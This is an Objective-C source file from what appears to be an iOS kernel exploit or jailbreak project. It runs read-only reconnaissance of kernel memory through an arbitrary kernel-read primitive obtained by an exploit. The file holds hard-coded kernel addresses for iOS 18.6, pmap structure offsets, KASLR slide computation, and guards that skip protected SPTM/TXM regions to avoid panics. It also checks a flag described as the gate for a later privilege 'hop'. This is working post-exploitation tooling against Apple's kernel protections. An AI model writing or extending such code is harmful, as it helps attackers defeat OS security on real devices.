//
//  KPMapScope.m
//  KexProofV2
//
//  R5e: read-only scope recon. No kernel writes — kread only.
//

#import "KPMapScope.h"
#import "KPLog.h"
#import "KPDump.h"

#import <string.h>

#import <libjailbreak/info.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/translation.h>

#import "exploit/kutils.h"
#import "exploit/offsets.h"
#import "TaskRop/pac.h"   // off_proc_ro_pr_task / off_task_map

// ---------------------------------------------------------------------------
// Static VAs from kernelcache-18.6-iphone16 (unslid). Slide is applied at runtime.
// ---------------------------------------------------------------------------

// Page-mgmt flags (R5c/R5d)
#define STATIC_FLAG_PROMOTE_21  0xfffffff007aa258aULL   // bit0 = promote to 0x21
#define STATIC_FLAG_PAGEMGMT    0xfffffff007aa2a31ULL   // second page-mgmt flag

// kernel_pmap / kernel_map global (R5d: 116 uses in the pmap region)
#define STATIC_KERNEL_PMAP      0xfffffff00aad31c0ULL   // pmap object (or +0x1c0 of page)
#define STATIC_KERNEL_PMAP_PAGE 0xfffffff00aad3000ULL

// Object layout decoded from walker 0x80dd69c (R5d)
#define PMAP_OFF_NEXT       0x08
#define PMAP_OFF_HEAD       0x10   // list sentinel
#define PMAP_OFF_START      0x10   // node range start (same slot, node view)
#define PMAP_OFF_END        0x18   // node range end
#define PMAP_OFF_PACPTR     0x40   // PAC-signed ptr (autda discr 0x250c)
#define PMAP_OFF_NODEFLAGS  0x38
#define PMAP_OFF_NODEPA     0x40   // node: translated PA-ish
#define PMAP_OFF_TYPEBYTE   0x92   // obj+216 used as state byte in walker
#define PMAP_OFF_COUNTISH   0x70   // obj+112

// FTE
#define FTE_SIZE            16
#define FTE_OFF_TYPE        2
#define FTE_OFF_READREF     8
#define FTE_OFF_WEREF       12

// ---------------------------------------------------------------------------
// Local helpers (kpRead/kpNote are static in KPDump.m)
// ---------------------------------------------------------------------------

static void scopeNote(NSMutableString *r, NSString *line) {
    [r appendString:line];
    [r appendString:@"\n"];
    [[KPLog shared] append:line];
}

static BOOL scopeRead(uint64_t addr, void *out, size_t size, const char *what, NSMutableString *r) {
    if (!gPrimitives.kreadbuf) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: KRW not live", what]);
        return NO;
    }
    if (!addr) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: null addr", what]);
        return NO;
    }
    if ((addr & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: not a kernel ptr 0x%016llx",
                      what, (unsigned long long)addr]);
        return NO;
    }
    // EL2 domain (SPTM/TXM images) panics on read — never touch.
    uint64_t sptmLo = kconstant(staticSptmBase);
    uint64_t txmLo  = kconstant(staticTxmBase);
    uint64_t slide  = kconstant(slide);
    if (sptmLo && addr >= sptmLo + slide && addr < sptmLo + slide + 0xF4000) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: EL2 SPTM domain 0x%016llx", what, (unsigned long long)addr]);
        return NO;
    }
    if (txmLo && addr >= txmLo + slide && addr < txmLo + slide + 0x64000) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: EL2 TXM domain 0x%016llx", what, (unsigned long long)addr]);
        return NO;
    }
    // Unmapped-read gate (same reason as KPDump 1.7.3): a garbage pointee
    // inside the kernel-looking range but outside the image panics the
    // physical aperture. Skip reads whose endpoints do not resolve to a PA.
    // Kernel image itself is always mapped — don't gate those.
    uint64_t kb = kconstant(base);
    BOOL inKernelImage = kb && addr >= kb && addr + size <= kb + 0x5000000ULL;
    if (!inKernelImage) {
        uint64_t pa0 = kvtophys(addr);
        uint64_t pa1 = kvtophys(addr + size - 1);
        if (!pa0 || !pa1) {
            scopeNote(r, [NSString stringWithFormat:
                          @"  [skip] %s: unmapped VA 0x%016llx (kvtophys=0/0x%llx) — пропуск",
                          what, (unsigned long long)addr, (unsigned long long)pa0]);
            return NO;
        }
    }
    memset(out, 0, size);
    gPrimitives.kreadbuf(addr, out, size);
    return YES;
}

static uint64_t scopeUntag(uint64_t p) {
    return kp_untag_ptr(p);
}

static uint64_t scopeSlideVA(uint64_t staticVA) {
    // staticVA is unslid; runtime = staticVA + slide
    // slide = kconstant(base) - kconstant(staticBase)
    uint64_t slide = kconstant(slide);
    if (!slide && kconstant(base) && kconstant(staticBase)) {
        slide = kconstant(base) - kconstant(staticBase);
    }
    return staticVA + slide;
}

static const char *scopeTypeName(uint8_t t) {
    switch (t) {
        case 0x00: return "GOD/init";
        case 0x0b: return "XNU_GENERIC";
        case 0x15: return "PAGE_TABLE";
        case 0x18: return "ROZONE";
        case 0x1a: return "IOFILTER";
        case 0x21: return "XNU_DEFAULT";
        case 0x37: return "T8110_DART?";
        default:   return "?";
    }
}

// ---------------------------------------------------------------------------
// The report — SAFE MODE
// Only reads bytes inside the kernel image (always mapped) + gSystemInfo
// values that the exploit already populated. NO pointer chasing, NO
// kvtophys/vtophys walks, NO proc/pmap entry walks. Reboot-class guard.
// ---------------------------------------------------------------------------

@implementation KPMapScope

+ (NSString *)kernelPmapScopeReport {
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== R5e: scope recon (READ-ONLY, safe mode) ===\n"];

    if (!gPrimitives.kreadbuf) {
        scopeNote(r, @"KRW primitives not live — run the exploit first.");
        return r;
    }

    // ---- 1. Boot constants (no kernel reads — just gSystemInfo) ----
    scopeNote(r, [NSString stringWithFormat:@"kernel base (runtime) = 0x%016llx",
                  (unsigned long long)kconstant(base)]);
    scopeNote(r, [NSString stringWithFormat:@"kernel slide          = 0x%016llx",
                  (unsigned long long)kconstant(slide)]);
    scopeNote(r, [NSString stringWithFormat:@"staticBase            = 0x%016llx",
                  (unsigned long long)kconstant(staticBase)]);
    scopeNote(r, [NSString stringWithFormat:@"virtBase/physBase     = 0x%016llx / 0x%016llx",
                  (unsigned long long)kconstant(virtBase),
                  (unsigned long long)kconstant(physBase)]);
    scopeNote(r, [NSString stringWithFormat:@"physSize              = 0x%016llx",
                  (unsigned long long)kconstant(physSize)]);

    // ---- 2. Page-mgmt flags — inside kernel image, always mapped ----
    [r appendString:@"\n--- page-mgmt flags (kernel image) ---\n"];

    uint64_t slide = kconstant(slide);
    uint64_t kb = kconstant(base);

    struct { uint64_t st; const char *name; } flags[2];
    flags[0].st = 0xfffffff007aa258aULL;
    flags[0].name = "promote-0x21";
    flags[1].st = 0xfffffff007aa2a31ULL;
    flags[1].name = "pagemgmt-2";

    for (unsigned i = 0; i < 2; i++) {
        uint64_t va = flags[i].st + slide;
        if (kb && va >= kb && va < kb + 0x5000000ULL) {
            uint8_t b = 0;
            gPrimitives.kreadbuf(va, &b, 1);
            scopeNote(r, [NSString stringWithFormat:
                @"  %-14s @ 0x%016llx = 0x%02x  bit0=%d",
                flags[i].name, (unsigned long long)va, b, b & 1]);
            if (i == 0) {
                if (b & 1) {
                    scopeNote(r, @"  >> PROMOTE-TO-0x21 ENABLED (hop 2 gate is open)");
                } else {
                    scopeNote(r, @"  >> promote disabled (collapse to 0x0b)");
                }
            }
        } else {
            scopeNote(r, [NSString stringWithFormat:
                @"  %-14s @ 0x%016llx — outside kernel image, skip",
                flags[i].name, (unsigned long long)(flags[i].st + slide)]);
        }
    }

    // ---- 3. XPF symbol slots (addresses only — do NOT deref) ----
    [r appendString:@"\n--- XPF symbols (slot addrs only) ---\n"];
    scopeNote(r, [NSString stringWithFormat:@"  libsptm_frame_table        slot @ 0x%016llx",
                  (unsigned long long)ksymbol(libsptm_frame_table)]);
    scopeNote(r, [NSString stringWithFormat:@"  libsptm_frame_type_params  slot @ 0x%016llx",
                  (unsigned long long)ksymbol(libsptm_frame_type_params)]);
    scopeNote(r, [NSString stringWithFormat:@"  vm_page_array_begin        slot @ 0x%016llx",
                  (unsigned long long)ksymbol(vm_page_array_beginning_addr)]);
    scopeNote(r, [NSString stringWithFormat:@"  pv_head_table              slot @ 0x%016llx",
                  (unsigned long long)ksymbol(pv_head_table)]);
    scopeNote(r, [NSString stringWithFormat:@"  vm_map.pmap off = %u   pmap.ttep off = %u   entry.next off = %u",
                  (unsigned)koffsetof(vm_map, pmap),
                  (unsigned)koffsetof(pmap, ttep),
                  (unsigned)koffsetof(vm_map_entry, next)]);

    // ---- 4. Verdict ----
    [r appendString:@"\n--- verdict (safe mode) ---\n"];
    scopeNote(r, @"  Safe mode: no pointer chasing, no proc/pmap walk, no vtophys.");
    scopeNote(r, @"  Deep recon (ucred FTE + vm_map_entry walk) is deferred until");
    scopeNote(r, @"  the panic source is isolated. Flags above are the R5c result.");
    scopeNote(r, @"  (No kernel writes performed.)");

    return r;
}

@end
